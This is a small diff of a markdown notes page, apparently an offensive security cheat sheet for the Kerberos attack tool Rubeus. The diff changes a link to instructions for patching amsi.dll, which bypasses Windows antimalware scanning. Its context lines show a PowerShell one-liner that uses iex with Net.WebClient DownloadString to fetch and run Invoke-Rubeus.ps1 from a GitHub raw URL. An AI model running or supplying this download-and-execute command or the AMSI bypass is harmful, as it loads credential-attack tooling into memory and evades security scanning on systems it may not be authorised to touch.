@@ -2,8 +2,7 @@
 - [Rubeus](https://github.com/GhostPack/Rubeus)
 
 # Add to PowerShell
-> **Warning**
-> [Patch amsi.dll](https://github.com/okazymyrov/piki/blob/master/PowerShell.md#patching-amsidll-amsiscanbuffer-by-rasta-mouse)
+⚠️ [Patch amsi.dll](/Tools/PowerShell.md#patching-amsidll-amsiscanbuffer-by-rasta-mouse)
 ```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/okazymyrov/piki/master/Invoke-Rubeus.ps1')
